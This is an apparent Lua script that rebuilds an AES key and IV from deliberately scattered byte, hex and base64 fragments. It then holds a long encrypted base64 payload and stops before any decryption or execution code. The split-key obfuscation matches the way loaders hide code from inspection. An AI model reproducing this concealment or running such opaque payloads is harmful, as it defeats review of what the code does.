local fragments = {
        {t="bytes", d={133,128,78,186}},
        {t="b64", d="TlIuMA=="},
        {t="bytes", d={21}},
        {t="bytes", d={122,107,227}},
        {t="hexchars", d={"9","9","2","4","5","0","a","c"}},
        {t="bytes", d={117}},
        {t="hexchars", d={"6","5","b","b","1","d"}},
        {t="hex", d="b4f0"},
        {t="bytes", d={192}},
        {t="bytes", d={97,66}},
        {t="bytes", d={251,247,88}},
        {t="bytes", d={189,126,111,102}}
}

local function b64decode(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = data:gsub('[^'..b..'=]', '')
    local t, m, a = {}, 0, 0
    for i = 1, #data do
        local c = data:sub(i,i)
        if c ~= '=' then
            local idx = b:find(c, 1, true)
            if not idx then break end
            a = bit32.bor(bit32.lshift(a, 6), (idx - 1))
            m = m + 6
            if m >= 8 then
                m = m - 8
                local byte = bit32.band(bit32.rshift(a, m), 0xFF)
                t[#t+1] = string.char(byte)
                a = bit32.band(a, (bit32.lshift(1, m) - 1))
            end
        end
    end
    return table.concat(t)
end

local function byte_to_hex(n)
    return string.format("%02x", bit32.band(n or 0, 0xFF))
end

local function bytes_to_hex(str)
    local out = {}
    for i = 1, #str do
        out[#out+1] = string.format("%02x", str:byte(i))
    end
    return table.concat(out)
end

local function rebuildKeyHex()
    local acc = {}
    for i = 1, #fragments do
        local f = fragments[i]
        if f.t == "hex" then
            acc[#acc+1] = f.d
        elseif f.t == "hexchars" then
            acc[#acc+1] = table.concat(f.d)
        elseif f.t == "bytes" then
            local tmp = {}
            for j = 1, #f.d do
                tmp[#tmp+1] = byte_to_hex(f.d[j])
            end
            acc[#acc+1] = table.concat(tmp)
        elseif f.t == "b64" then
            acc[#acc+1] = bytes_to_hex(b64decode(f.d))
        else
            acc[#acc+1] = tostring(f.d)
        end
    end
    local hex = table.concat(acc)
    assert(#hex == 64, "Rebuilt AES key must be 64 hex chars, got "..#hex)
    return hex
end

local AES_KEY_HEX = rebuildKeyHex()

local iv_fragments = {
        {t="b64", d="ZiE="},
        {t="hex", d="99ea"},
        {t="hex", d="ce"},
        {t="bytes", d={224,231,107}},
        {t="b64", d="x/U="},
        {t="hex", d="90ec"},
        {t="bytes", d={29,1,64}},
        {t="bytes", d={57}}
}

local function rebuild_iv_hex()
    local acc = {}
    for i = 1, #iv_fragments do
        local f = iv_fragments[i]
        if f.t == "hex" then
            acc[#acc+1] = f.d
        elseif f.t == "hexchars" then
            acc[#acc+1] = table.concat(f.d)
        elseif f.t == "bytes" then
            local tmp = {}
            for j = 1, #f.d do
                tmp[#tmp+1] = byte_to_hex(f.d[j])
            end
            acc[#acc+1] = table.concat(tmp)
        elseif f.t == "b64" then
            acc[#acc+1] = bytes_to_hex(b64decode(f.d))
        else
            acc[#acc+1] = tostring(f.d)
        end
    end
    return table.concat(acc)
end

local IV_HEX = rebuild_iv_hex()

local cipher_fragments = {
        {t="b64", d="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